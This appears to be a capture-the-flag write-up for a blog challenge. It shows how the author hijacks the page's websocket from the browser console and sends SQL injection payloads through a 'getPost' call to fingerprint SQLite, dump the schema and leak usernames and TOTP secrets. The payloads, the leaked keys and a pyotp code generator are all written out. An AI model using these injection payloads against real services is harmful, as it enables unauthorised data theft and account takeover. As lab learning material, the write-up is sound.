If you look at the source code of the challenge you can see they used browserify for bundling the dependencies. I wrote my version of this client so you can check those dependencies at the link end of this writeup.

But in this writeup we are gonna use chrome developer console, put breakpoint in a good place and take control of the socket. Test manually and leak totp keys.

![image-20200427112039042](https://github.com/BirdsArentRealCTF/Blog-from-the-future/raw/master/image-20200427112039042.png)

I choose 2146th line because we can see response from server in here. And we can access to websocket and msgpack class. 

![image-20200427112558712](https://github.com/BirdsArentRealCTF/Blog-from-the-future/raw/master/image-20200427112558712.png)

After we get those we can manually test our payloads.

```javascript
r.send(o.encode(["getPost", "1"]))
```

![image-20200427112824345](https://github.com/BirdsArentRealCTF/Blog-from-the-future/raw/master/image-20200427112824345.png)

```json
author: 1
hidden: 0
id: 2
postDate: 1580947200000
text: "They're pretty cool, in my opinion."
title: "A review of American sockets"
```

This is the post structure. Mind the hidden field because if its true we can't see it.

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification using these payloads we can identify database system and develop payload for it.

```javascript
r.send(o.encode(["getPost", "1 and sqlite_version()=sqlite_version()"]))
```

It worked so we have sqlite backend. We can leak database structure with payload below.

```javascript
r.send(o.encode(["getPost", "999 or 1=1 UNION SELECT sql,sql,sql,sql,sql,0 from sqlite_master"]))
```

This payload allows us to see whole database structure.

```sql
CREATE TABLE "users" (
	"id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"username"	TEXT NOT NULL,
	"totp_key"	TEXT NOT NULL
)
CREATE TABLE "posts" (
	"id"	INTEGER PRIMARY KEY AUTOINCREMENT,
	"title"	TEXT NOT NULL,
	"author"	INTEGER NOT NULL,
	"text"	TEXT NOT NULL,
	"postDate"	INTEGER NOT NULL,
	"hidden"	INTEGER DEFAULT 0
)
```

After find out column names we can get user names and totp keys.

```javascript
r.send(o.encode(["getPost", "999 or 1=1 UNION SELECT username,totp_key,0,0,0,0 from users "]));
```

```javascript
{id: "alice", title: "J5YD4O2BIZYEMVJYIY3F24S3GQ2VC3ZTKJQVW5JFJUYHKODXORQQ", author: 0, text: 0, postDate: 0, …}
{id: "bob", title: "IE3V2RR4HRLUEOBDLVCWCQTYF5LT6RTCONNDMULGGJGS4STUMYWA", author: 0, text: 0, postDate: 0, …}
```

After leaking user names and totp keys we need to create totp password. I used pyotp library.

```python
import pyotp
totp = pyotp.TOTP('IE3V2RR4HRLUEOBDLVCWCQTYF5LT6RTCONNDMULGGJGS4STUMYWA')
totp.now() # => '677619'
```

Login and get the flag!

Don't forget to check my automated blind boolean script https://github.com/BirdsArentRealCTF/Blog-from-the-future/blob/master/index.html

Do you have any questions or suggestion? Feel free to contact via discord. **enjloezz#7444**
